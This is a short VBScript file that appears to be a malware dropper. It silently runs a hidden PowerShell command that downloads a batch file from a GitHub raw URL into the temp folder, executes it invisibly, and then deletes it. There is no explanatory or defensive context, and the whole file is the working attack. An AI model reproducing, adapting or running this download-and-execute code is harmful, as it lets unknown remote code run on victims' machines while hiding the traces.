Dim voqjzy665
Set voqjzy665=CreateObject("WScript.Shell")
voqjzy665.Run "powershell -NoP -WindowStyle Hidden -C $p=$env:TEMP+'\u640541.bat';(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/aledreamer1234-lgtm/hh/refs/heads/main/gay.bat',$p);$w=New-Object -ComObject WScript.Shell;$w.Run('cmd /c '+$p+' & timeout /t 2 >nul & del /f /q '+$p+'',0,$false)",0,False
